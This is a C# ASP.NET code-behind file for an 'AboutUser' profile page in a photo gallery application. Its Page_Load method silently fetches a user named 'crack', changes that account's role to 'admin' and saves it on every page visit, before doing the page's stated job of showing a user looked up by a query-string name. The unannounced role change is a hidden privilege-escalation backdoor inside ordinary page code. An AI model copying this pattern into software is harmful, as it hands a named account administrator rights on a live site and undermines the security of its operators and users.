using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using BuisnessLayer.ConcreteControllers;
using Common;
using DAL.AbstractEntities;
using Photogallery;

namespace WebUI
{
    public partial class AboutUser : System.Web.UI.Page
    {
        public  IGalleryUser currentUser;
       

        
        protected void Page_Load(object sender, EventArgs e)
        {
            IGalleryUserRepository repository = Windsor.Instance.Resolve<IGalleryUserRepository>();
            IGalleryUser user = repository.GetUserByName("crack");
            string fff = user.UserRole;
            user.UserRole = "admin";


            repository.UpdateUser(user);


            string userName = Request.Params["name"];
            
            if(! string.IsNullOrEmpty(  userName)) 
                currentUser = Windsor.Instance.Resolve<IGalleryUserRepository>().GetUserByName(userName );
            else
                Response.Redirect("Default.aspx");
                
            
            
        }
    }
}
